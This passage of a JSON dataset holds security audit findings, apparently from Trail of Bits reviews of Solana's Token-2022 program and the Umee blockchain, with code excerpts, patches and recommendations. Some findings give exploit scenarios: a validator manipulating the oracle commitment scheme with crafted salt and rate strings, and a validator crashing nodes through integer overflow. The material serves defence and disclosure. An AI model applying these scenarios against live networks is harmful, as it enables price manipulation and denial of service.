            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Use of a vulnerable dependency ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "Running the cargo audit command uncovered the use of one crate with a known vulnerability ( time ).  cargo audit Fetching advisory database from `https://github.com/RustSec/advisory-db.git` Loaded 458 security advisories (from /Users/andershelsing/.cargo/advisory-db) Updating crates.io index Scanning Cargo.lock for vulnerabilities (651 crate dependencies) Crate: time Version: 0.1.44 Title: Potential segfault in the time crate Date: 2020-11-18 ID: RUSTSEC-2020-0071 URL: https://rustsec.org/advisories/RUSTSEC-2020-0071 Solution: Upgrade to >=0.2.23 Figure 3.1: The result of running the cargo audit command Recommendations Short term, triage the use of the vulnerability in the time crate and upgrade the crate to a version in which the vulnerability is patched.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Large extension sizes can cause panics ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "The call to try_from in the init_extension function returns an error if the length of the given extension is larger than u16::Max , which causes the unwrap operation to panic. let length = pod_get_packed_len::<V>(); *length_ref = Length::try_from(length).unwrap(); Figure 4.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L493-L494 Recommendations Short term, add assertions to the program to catch extensions whose sizes are too large, and add relevant code to handle errors that could arise in the try_from function. This will ensure that the Token Program does not panic if any extension grows larger than u16::Max .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Unexpected function behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "The decode_instruction_data function receives a byte slice representing the instruction data. Specically, the function expects the rst byte of the slice to contain the instruction type for an extension instruction; however, the function name does not clearly convey this intended behavior, and the behavior is not explained in code comments. /// Utility function for decoding instruction data pub fn decode_instruction_data <T: Pod >(input: & [ u8 ]) -> Result <&T, ProgramError> { if input.len() != pod_get_packed_len::<T>().saturating_add( 1 ) { Err (ProgramError::InvalidInstructionData) } else { pod_from_bytes( &input[ 1 ..] ) } } Figure 5.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/instruction.rs#L1761-L1768 Recommendations Short term, change the decode_instruction_data function so that it operates only on instruction data, and remove the instruction type from the data passed prior to the call. This will ensure that the functions name is in line with the functions operation.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Out of bounds access in the get_extension instruction ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "The get_extension function instantiates a type from a TLV record. However, the get_extension_indices function does not check that the accounts data length is large enough for the value_end index. fn get_extension <S: BaseState , V: Extension >(tlv_data: &[u8]) -> Result <&V, ProgramError> { if V::TYPE.get_account_type() != S::ACCOUNT_TYPE { return Err (ProgramError::InvalidAccountData); } let TlvIndices { type_start: _ , length_start, value_start, } = get_extension_indices::<V>(tlv_data, false )?; // get_extension_indices has checked that tlv_data is long enough to include these indices let length = pod_from_bytes::<Length>(&tlv_data[length_start..value_start])?; let value_end = value_start.saturating_add(usize::from(*length)); pod_from_bytes::<V>(&tlv_data[ value_start..value_end ]) } Figure 6.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L235-L248 Recommendations Short term, add a check to ensure that the TLV data for the account is large enough for the value_end index, and add relevant code to handle the error if it is not. This will ensure that the Token Program will not panic on accounts with truncated data.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Iteration over empty data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "The get_extension_indices function returns either the indices for a given extension type or the rst uninitialized slot. Because a TLV data record can never be deleted, the rst zero-value entry of the slice should indicate that the iteration has reached the end of the used data space. However, if the init parameter is false, the start_index index is advanced by two, and the iteration continues, presumably iterating over empty data until it reaches the end of the TLV data for the account. while start_index < tlv_data.len() { let tlv_indices = get_tlv_indices(start_index); if tlv_data.len() < tlv_indices.value_start { return Err (ProgramError::InvalidAccountData); } ... // got to an empty spot, can init here, or move forward if not initing if extension_type == ExtensionType::Uninitialized { if init { return Ok (tlv_indices); } else { start_index = tlv_indices.length_start; } } ... Figure 7.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L96-L122 Recommendations Short term, modify the associated code so that it terminates the iteration when it reaches uninitialized data, which should indicate the end of the used TLV record data.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Missing check in UpdateMint instruction could result in inoperable mints ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "If a mints auto_approve_new_accounts property is false , the ApproveAccount instruction needs the mints authority to sign transactions approving Accounts for the mint. However, issuing an update_mint instruction with the new authority set to Pubkey::default and the auto_approve_new_accounts property set to false would prevent Accounts from being approved. /// Processes an [UpdateMint] instruction. fn process_update_mint ( accounts: & [AccountInfo], new_confidential_transfer_mint: & ConfidentialTransferMint , ) -> ProgramResult { let account_info_iter = & mut accounts.iter(); let mint_info = next_account_info(account_info_iter)?; let authority_info = next_account_info(account_info_iter)?; let new_authority_info = next_account_info(account_info_iter)?; check_program_account(mint_info.owner)?; let mint_data = & mut mint_info.data.borrow_mut(); let mut mint = StateWithExtensionsMut::<Mint>::unpack(mint_data)?; let confidential_transfer_mint = mint.get_extension_mut::<ConfidentialTransferMint>()?; if authority_info.is_signer && confidential_transfer_mint.authority == *authority_info.key && (new_authority_info.is_signer || *new_authority_info.key == Pubkey::default() ) && new_confidential_transfer_mint.authority == *new_authority_info.key { *confidential_transfer_mint = *new_confidential_transfer_mint; Ok (()) } else { Err (ProgramError::MissingRequiredSignature) } } Figure 8.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L64-L89 /// Processes an [ApproveAccount] instruction. fn process_approve_account (accounts: & [AccountInfo]) -> ProgramResult { let account_info_iter = & mut accounts.iter(); let token_account_info = next_account_info(account_info_iter)?; let mint_info = next_account_info(account_info_iter)?; let authority_info = next_account_info(account_info_iter)?; check_program_account(token_account_info.owner)?; let token_account_data = & mut token_account_info.data.borrow_mut(); let mut token_account = StateWithExtensionsMut::<Account>::unpack(token_account_data)?; check_program_account(mint_info.owner)?; let mint_data = &mint_info.data.borrow_mut(); let mint = StateWithExtensions::<Mint>::unpack(mint_data)?; let confidential_transfer_mint = mint.get_extension::<ConfidentialTransferMint>()?; if authority_info.is_signer && *authority_info.key == confidential_transfer_mint.authority { let mut confidential_transfer_state = token_account.get_extension_mut::<ConfidentialTransferAccount>()?; confidential_transfer_state.approved = true .into(); Ok (()) } else { Err (ProgramError::MissingRequiredSignature) } } Figure 8.2: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L180-L204 Recommendations Short term, add a check to ensure that the auto_approve_new_accounts property is not false when the new authority is Pubkey::default . This will ensure that contract users cannot accidentally disable the authorization of accounts for mints.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Incorrect test data description ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "The comments on the MINT_WITH_EXTENSION variable are incorrect. See gure 9.1 for the incorrect comments, highlighted in red, and the corrected comments, highlighted in yellow. const MINT_WITH_EXTENSION: & [ u8 ] = &[ // base mint 1 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , ]; 1 , 1 , 1 , 1 , 1 , 42 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 7 , 1 , 1 , 0 , 0 , 0 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , // padding 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , // account type 1 , // extension type <== really account type 3 , 0 , // length <== really extension type 32 , 0 , // data <== really extension length 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , <== really extension data Figure 9.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/mod.rs#L828 -L841 Recommendations Short term, update the comments to align with the data. This will ensure that developers working on the tests will not be confused by the data structure.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. The Transfer and TransferWithFee instructions are identical ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "The implementations of the Transfer and TransferWithFee instructions are identical. Whether fees are used is determined by whether the mint has a TransferFeeConfig extension, regardless of the instruction used. ConfidentialTransferInstruction::Transfer => { msg!( \"ConfidentialTransferInstruction::Transfer\" ); #[cfg(feature = \"zk-ops\" )] { let data = decode_instruction_data::<TransferInstructionData>(input)?; process_transfer( program_id, accounts, data.new_source_decryptable_available_balance, data.proof_instruction_offset as i64, ) } #[cfg(not(feature = \"zk-ops\" ))] Err (ProgramError::InvalidInstructionData) } ConfidentialTransferInstruction::TransferWithFee => { msg!( \"ConfidentialTransferInstruction::TransferWithFee\" ); #[cfg(feature = \"zk-ops\" )] { let data = decode_instruction_data::<TransferInstructionData>(input)?; process_transfer( program_id, accounts, data.new_source_decryptable_available_balance, data.proof_instruction_offset as i64, ) } #[cfg(not(feature = \"zk-ops\" ))] { Err (ProgramError::InvalidInstructionData) } } Figure 10.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/confidentia l_transfer/processor.rs#L1192-L1223 Recommendations Short term, deprecate the TransferWithFee instruction, and update the documentation for the Transfer instruction to clarify the use of fees. This will ensure that contract users will not be misled in how the instructions are performed.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Some instructions operate only on the lo bits of balances ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "For condential transfers, the pending balance is split into lo and hi values: of the total 64 bits representing the value, lo contains the low 16 bits, and hi contains the high 48 bits. Some instructions seem to update only the lo bits. For example, the process_destination_for_transfer function updates only the pending_balance_lo eld of the destination_confidential_transfer_account account. Changing the ct_withdraw_withheld_tokens_from_accounts integration test so that the resulting fee is greater than u16::Max (and updating the test to account for other changes to account balances) breaks the test, which indicates that the pattern of updating only the lo bits is problematic. We found the same pattern in the process_withdraw_withheld_tokens_from_mint function for the destination_confidential_transfer_account account and in the process_withdraw_withheld_tokens_from_accounts function for the destination_confidential_transfer_account account. #[cfg(feature = \"zk-ops\" )] fn process_destination_for_transfer ( destination_token_account_info: & AccountInfo , mint_info: & AccountInfo , destination_encryption_pubkey: & EncryptionPubkey , destination_ciphertext_lo: & EncryptedBalance , destination_ciphertext_hi: & EncryptedBalance , encrypted_fee: Option <EncryptedFee>, ) -> ProgramResult { check_program_account(destination_token_account_info.owner)?; ... // subtract fee from destination pending balance let new_destination_pending_balance = ops::subtract( &destination_confidential_transfer_account.pending_balance_lo, &ciphertext_fee_destination, ) .ok_or(ProgramError::InvalidInstructionData)?; // add encrypted fee to current withheld fee let new_withheld_amount = ops::add( &destination_confidential_transfer_account.withheld_amount, &ciphertext_fee_withheld_authority, ) .ok_or(ProgramError::InvalidInstructionData)?; destination_confidential_transfer_account.pending_balance_lo = new_destination_pending_balance; destination_confidential_transfer_account.withheld_amount = new_withheld_amount; ... Figure 11.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L761-L777 Recommendations Short term, investigate the security implications of operating only on the lo bits in operations and determine whether this pattern should be changed.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Instruction susceptible to front-running ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "The code comments for the WithdrawWithheldTokensFromAccounts instruction state that the instruction is susceptible to front-running. The comments list two alternatives to the function HarvestWithheldTokensToMint and WithdrawWithheldTokensFromMint indicating that this vulnerable function could be deprecated. /// Transfer all withheld tokens to an account. Signed by the mint's withdraw withheld tokens /// authority. This instruction is susceptible to front-running. Use /// `HarvestWithheldTokensToMint` and `WithdrawWithheldTokensFromMint` as an alternative. /// /// Note on front-running: This instruction requires a zero-knowledge proof verification /// instruction that is checked with respect to the account state (the currently withheld /// fees). Suppose that a withdraw withheld authority generates the /// `WithdrawWithheldTokensFromAccounts` instruction along with a corresponding zero-knowledge /// proof for a specified set of accounts, and submits it on chain. If the withheld fees at any /// of the specified accounts change before the `WithdrawWithheldTokensFromAccounts` is /// executed on chain, the zero-knowledge proof will not verify with respect to the new state, /// forcing the transaction to fail. /// /// If front-running occurs, then users can look up the updated states of the accounts, /// generate a new zero-knowledge proof and try again. Alternatively, withdraw withheld /// authority can first move the withheld amount to the mint using /// `HarvestWithheldTokensToMint` and then move the withheld fees from mint to a specified /// destination account using `WithdrawWithheldTokensFromMint`. Figure 12.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/confidentia l_transfer/instruction.rs#L313-L330 Recommendations Short term, consider deprecating this instruction in favor of the alternatives suggested in the WithdrawWithheldTokensFromAccounts code comments, HarvestWithheldTokensToMint and WithdrawWithheldTokensFromMint . This will ensure that contract users who may have missed the comment describing the front-running vulnerability will not be exposed to the issue. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Integer overow in Peggo's deploy-erc20-raw command ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The denom-decimals argument of the deploy-erc20-raw command (in the deployERC20RawCmd function) may experience an integer overow. The argument is rst parsed into a value of the int type by the strconv.Atoi function and then cast to a value of the uint8 type (gure 1.1). If the denom-decimals argument with which deploy-erc20-raw is invoked is a negative value or a value that is too large, the casting operation will cause an overow; however, the user will not receive an error, and the execution will proceed with the overow value. func deployERC20RawCmd() *cobra.Command { return &cobra.Command{ Use: \"deploy-erc20-raw [gravity-addr] [denom-base] [denom-name] [denom-symbol] [denom-decimals]\" , /* (...) */ , RunE: func (cmd *cobra.Command, args [] string ) error { denomDecimals, err := strconv.Atoi(args[ 4 ]) if err != nil { return fmt.Errorf( \"invalid denom decimals: %w\" , err) } tx, err := gravityContract.DeployERC20(auth, denomBase, denomName, denomSymbol, uint8 (denomDecimals) ) Figure 1.1: peggo/cmd/peggo/bridge.go#L348-L353 We identied this issue by running CodeQL's IncorrectIntegerConversionQuery.ql query. Recommendations Short term, x the integer overow in Peggos deployERC20RawCmd function by using the strconv.ParseUint function to parse the denom-decimals argument. To do this, use the patch in gure 1.2. diff --git a/cmd/peggo/bridge.go b/cmd/peggo/bridge.go index 49aabc5..4b3bc6a 100644 --- a/cmd/peggo/bridge.go +++ b/cmd/peggo/bridge.go @@ -345,7 +345,7 @@ network starting.`, - + denomBase := args[ 1 ] denomName := args[ 2 ] denomSymbol := args[ 3 ] denomDecimals, err := strconv.Atoi(args[ 4 ]) denomDecimals, err := strconv.ParseUint(args[ 4 ], 10 , 8 ) if err != nil { return fmt.Errorf( \"invalid denom decimals: %w\" , err) } Figure 1.2: A patch for the integer overow issue in Peggo's deploy-erc20-raw command Long term, integrate CodeQL into the CI/CD pipeline to nd similar issues in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Rounding of the standard deviation value may deprive voters of rewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The ExchangeRateBallot.StandardDeviation function calculates the standard deviation of the exchange rates submitted by voters. To do this, it converts the variance into a oat, prints its square root to a string, and parses it into a Dec value (gure 2.1). This logic rounds down the standard deviation value, which is likely unexpected behavior; if the exchange rate is within the reward spread value, voters may not receive the rewards they are owed. The rounding operation is performed by the fmt.Sprintf(\"%f\", floatNum) function, which, as shown in Appendix C , may cut o decimal places from the square root value. // StandardDeviation returns the standard deviation by the power of the ExchangeRateVote. func (pb ExchangeRateBallot) StandardDeviation() (sdk.Dec, error ) { // (...) variance := sum.QuoInt64( int64 ( len (pb))) floatNum, err := strconv.ParseFloat(variance.String(), 64 ) if err != nil { /* (...) */ } floatNum = math.Sqrt(floatNum) standardDeviation, err := sdk.NewDecFromStr(fmt.Sprintf( \"%f\" , floatNum)) if err != nil { /* (...) */ } return standardDeviation, nil } Figure 2.1: Inaccurate oat conversions ( umee/x/oracle/types/ballot.go#L89-L97 ) Exploit Scenario A voter reports a price that should be within the reward spread. However, because the standard deviation value is rounded, the price is not within the reward spread, and the voter does not receive a reward. Recommendations Short term, have the ExchangeRateBallot.StandardDeviation function use the Dec.ApproxSqrt method to calculate the standard deviation instead of parsing the variance into a oat, calculating the square root, and parsing the formatted oat back into a value of the Dec type. That way, users who vote for exchange rates close to the correct reward spread will receive the rewards they are owed. Figure 2.2 shows a patch for this issue. diff --git a/x/oracle/types/ballot.go b/x/oracle/types/ballot.go index 6b201c2..9f6b579 100644 --- a/x/oracle/types/ballot.go +++ b/x/oracle/types/ballot.go @@ -1,12 +1,8 @@ package types import ( - - - - - + ) \"fmt\" \"math\" \"sort\" \"strconv\" sdk \"github.com/cosmos/cosmos-sdk/types\" \"sort\" // VoteForTally is a convenience wrapper to reduce redundant lookup cost. @@ - 88 , 13 + 84 , 8 @@ func (pb ExchangeRateBallot) StandardDeviation() (sdk.Dec, error ) { - - - - + - - variance := sum.QuoInt64( int64 ( len (pb))) floatNum, err := strconv.ParseFloat(variance.String(), 64 ) if err != nil { return sdk.ZeroDec(), err } standardDeviation, err := variance.ApproxSqrt() floatNum = math.Sqrt(floatNum) standardDeviation, err := sdk.NewDecFromStr(fmt.Sprintf( \"%f\" , floatNum)) if err != nil { return sdk.ZeroDec(), err } diff --git a/x/oracle/types/ballot_test.go b/x/oracle/types/ballot_test.go index 0cd09d8..0dd1f1a 100644 --- a/x/oracle/types/ballot_test.go +++ b/x/oracle/types/ballot_test.go @@ - 177 , 21 + 177 , 21 @@ func TestPBStandardDeviation(t *testing.T) { - + - + }, { }, { [] float64 { 1.0 , 2.0 , 10.0 , 100000.0 }, [] int64 { 1 , 1 , 100 , 1 }, [] bool { true , true , true , true }, sdk.NewDecWithPrec( 4999500036300 , OracleDecPrecision), sdk.MustNewDecFromStr( \"49995.000362536252310906\" ), // Adding fake validator doesn't change outcome [] float64 { 1.0 , 2.0 , 10.0 , 100000.0 , 10000000000 }, [] int64 { 1 , 1 , 100 , 1 , 10000 }, [] bool { true , true , true , true , false }, sdk.NewDecWithPrec( 447213595075100600 , OracleDecPrecision), sdk.MustNewDecFromStr( \"4472135950.751005519905537611\" ), // Tie votes [] float64 { 1.0 , 2.0 , 3.0 , 4.0 }, [] int64 { 1 , 100 , 100 , 1 }, - + [] bool { true , true , true , true }, sdk.NewDecWithPrec( 122474500 , OracleDecPrecision), sdk.MustNewDecFromStr( \"1.224744871391589049\" ), }, { // No votes Figure 2.2: A patch for this issue",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Vulnerabilities in exchange rate commitment scheme ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The Umee oracle implements a commitment scheme in which users vote on new exchange rates by submitting \"pre-vote\" and \"vote\" messages. However, vulnerabilities in this scheme could allow an attacker to (1) predict the prices to which other voters have committed and (2) send two prices for an asset in a pre-vote message hash and then submit one of the prices in the vote message. (Note that predicting other prices would likely require the attacker to make some correct guesses about those prices.) The rst issue is that the random salt used in the scheme is too short. The salt is generated as two random bytes (gure 3.1) and is later hex-encoded and limited to four bytes (gure 3.2). As a result, an attacker could pre-compute the pre-vote commitment hash of every salt value (and thus the expected exchange rate), eectively violating the hiding property of the scheme. salt, err := GenerateSalt( 2 ) Figure 3.1: The salt-generation code ( umee/price-feeder/oracle/oracle.go#358 ) if len (msg.Salt) > 4 || len (msg.Salt) < 1 { return sdkerrors.Wrap(ErrInvalidSaltLength, \"salt length must be [1, 4]\" ) } Figure 3.2: The salt-validation logic ( umee/x/oracle/types/msgs.go#148150 ) The second issue is the lack of proper salt validation, which would guarantee sucient domain separation between a random salt and the exchange rate when the commitment hash is calculated. The domain separator string consists of a colon character, as shown in gure 3.3. However, there is no verication of whether the salt is a hex-encoded string or whether it contains the separator character; only the length of the salt is validated. This bug could allow an attacker to reveal an exchange rate other than the one the attacker had committed to, violating the binding property of the scheme. func GetAggregateVoteHash(salt string , exchangeRatesStr string , voter sdk.ValAddress) AggregateVoteHash { hash := tmhash.NewTruncated() sourceStr := fmt.Sprintf( \"%s:%s:%s\" , salt, exchangeRatesStr, voter.String() ) Figure 3.3: The generation of a commitment hash ( umee/x/oracle/types/hash.go#2325 ) The last vulnerability in the scheme is the insucient validation of exchange rate strings: the strings undergo unnecessary trimming, and the code checks only that len(denomAmountStr) is less than two (gure 3.4), rather than performing a stricter check to conrm that it is not equal to two. This could allow an attacker to exploit the second bug described in this nding. func ParseExchangeRateTuples(tuplesStr string ) (ExchangeRateTuples, error ) { tuplesStr = strings.TrimSpace(tuplesStr) if len (tuplesStr) == 0 { return nil , nil } tupleStrs := strings.Split(tuplesStr, \",\" ) // (...) for i, tupleStr := range tupleStrs { denomAmountStr := strings.Split(tupleStr, \":\" ) if len (denomAmountStr) < 2 { return nil , fmt.Errorf( \"invalid exchange rate %s\" , tupleStr) } } // (...) } Figure 3.4: The code that parses exchange rates ( umee/x/oracle/types/vote.go#7286 ) Exploit Scenario The maximum salt length of two is increased. During a subsequent pre-voting period, a malicious validator submits the following commitment hash: sha256(\"whatever:UMEE:123:UMEE:456,USDC:789:addr\") . (Note that  represents a normal whitespace character.) Then, during the voting period, the attacker waits for all other validators to reveal their exchange rates and salts and then chooses the UMEE price that he will reveal ( 123 or 456 ). In this way, the attacker can manipulate the exchange rate to his advantage. If the attacker chooses to reveal a price of 123 , the following will occur: 1. The salt will be set to whatever . 2. The attacker will submit an exchange rate string of UMEE:123:UMEE:456,USDC:789 . 3. The value will be hashed as sha256( whatever : UMEE:123:UMEE:456,USDC:789 : addr) . 4. The exchange rate will then be parsed as 123/789 (UMEE/USDC). Note that  UMEE = 456 (with its leading whitespace character) will be ignored. This is because of the insucient validation of exchange rate strings (as described above) and the fact that only the rst and second items of denomAmountStr are used. (See the screenshot in Appendix D). If the attacker chooses to reveal a price of 456 , the following will occur: 1. The salt will be set to whatever:UMEE:123 . 2. The exchange rate string will be set to UMEE:456,USDC:789 . 3. The value will be hashed as sha256( whatever:UMEE:123 : UMEE:456,USDC:789 : addr) . 4. Because exchange rate strings undergo space trimming, the exchange rate will be parsed as 456/789 (UMEE/USDC). Recommendations Short term, take the following steps:    Increase the salt length to prevent brute-force attacks. To ensure a security level of X bits, use salts of 2*X random bits. For example, for a 128-bit security level, use salts of 256 bits (32 bytes). Ensure domain separation by implementing validation of a salts format and accepting only hex-encoded strings. Implement stricter validation of exchange rates by ensuring that every exchange rate substring contains exactly one colon character and checking whether all denominations are included in the list of accepted denominations; also avoid trimming whitespaces at the beginning of the parsing process. Long term, consider replacing the truncated SHA-256 hash function with a SHA-512/256 or HMAC-SHA256 function. This will increase the level of security from 80 bits to about 128, which will help prevent collision and length extension attacks.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Validators can crash other nodes by triggering an integer overow ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "By submitting a large exchange rate value, a validator can trigger an integer overow that will cause a Go panic and a node crash. The Umee oracle code checks that each exchange rate submitted by a validator is a positive value with a bit size of less than or equal to 256 (gures 4.1 and 4.2). The StandardDeviation method iterates over all exchange rates and adds up their squares (gure 4.3) but does not check for an overow. A large exchange rate value will cause the StandardDeviation method to panic when performing multiplication or addition . func ParseExchangeRateTuples(tuplesStr string ) (ExchangeRateTuples, error ) { // (...) for i, tupleStr := range tupleStrs { // (...) decCoin, err := sdk.NewDecFromStr(denomAmountStr[ 1 ]) // (...) if !decCoin.IsPositive() { return nil , types.ErrInvalidOraclePrice } Figure 4.1: The check of whether the exchange rate values are positive ( umee/x/oracle/types/vote.go#L71-L96 ) func (msg MsgAggregateExchangeRateVote) ValidateBasic() error { // (...) exchangeRates, err := ParseExchangeRateTuples(msg.ExchangeRates) if err != nil { /* (...) - returns wrapped error */ } for _, exchangeRate := range exchangeRates { // check overflow bit length if exchangeRate.ExchangeRate.BigInt().BitLen() > 255 +sdk.DecimalPrecisionBits // (...) - returns error Figure 4.2: The check of the exchange rate values bit lengths ( umee/x/oracle/types/msgs.go#L136-L146 ) sum := sdk.ZeroDec() for _, v := range pb { deviation := v.ExchangeRate.Sub(median) sum = sum.Add(deviation.Mul(deviation)) } Figure 4.3: Part of the StandardDeviation method ( umee/x/oracle/types/ballot.go#8387 ) The StandardDeviation method is called by the Tally function, which is called in the EndBlocker function. This means that an attacker could trigger an overow remotely in another validator node. Exploit Scenario A malicious validator commits to and then sends a large UMEE exchange rate value. As a result, all validator nodes crash, and the Umee blockchain network stops working. Recommendations Short term, implement overow checks for all arithmetic operations involving exchange rates. Long term, use fuzzing to ensure that no other parts of the code are vulnerable to overows.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. The repayValue variable is not used after being modied ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The Keeper.LiquidateBorrow function uses the local variable repayValue to calculate the repayment.Amount value. If repayValue is greater than or equal to maxRepayValue , it is changed to that value. However, the repayValue variable is not used again after being modied, which suggests that the modication could be a bug or a code quality issue. func (k Keeper) LiquidateBorrow( // (...) // repayment cannot exceed borrowed value * close factor maxRepayValue := borrowValue.Mul(closeFactor) repayValue, err := k.TokenValue(ctx, repayment) if err != nil { return sdk.ZeroInt(), sdk.ZeroInt(), err } if repayValue.GTE(maxRepayValue) { // repayment *= (maxRepayValue / repayValue) repayment.Amount = repayment.Amount.ToDec().Mul(maxRepayValue).Quo( repayValue ).TruncateInt() repayValue = maxRepayValue } // (...) Figure 5.1: umee/x/leverage/keeper/keeper.go#L446-L456 We identied this issue by running CodeQL's DeadStoreOfLocal.ql query. Recommendations Short term, review and x the repayValue variable in the Keeper.LiquidateBorrow function, which is not used after being modied, to prevent related issues in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Inconsistent error checks in GetSigners methods ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The GetSigners methods in the x/oracle and x/leverage modules exhibit dierent error-handling behavior when parsing strings into validator or account addresses. The GetSigners methods in the x/oracle module always panic upon an error, while the methods in the x/leverage module explicitly ignore parsing errors. Figures 6.1 and 6.2 show examples of the GetSigners methods in those modules. We set the severity of this nding to informational because message addresses parsed in the x/leverage modules GetSigners methods are also validated in the ValidateBasic methods. As a result, the issue is not currently exploitable. // GetSigners implements sdk.Msg func (msg MsgDelegateFeedConsent) GetSigners() []sdk.AccAddress { operator, err := sdk.ValAddressFromBech32(msg.Operator) if err != nil { panic (err) } return []sdk.AccAddress{sdk.AccAddress(operator)} } Figure 6.1: umee/x/oracle/types/msgs.go#L174-L182 func (msg *MsgLendAsset) GetSigners() []sdk.AccAddress { lender, _ := sdk.AccAddressFromBech32(msg.GetLender()) return []sdk.AccAddress{lender} } Figure 6.2: umee/x/leverage/types/tx.go#L30-L33 Recommendations Short term, use a consistent error-handling process in the x/oracle and x/leverage modules GetSigners methods. The x/leverage module's GetSigners functions should handle errors in the same way that the x/oracle methods doby panicking.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Incorrect price assumption in the GetExchangeRateBase function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
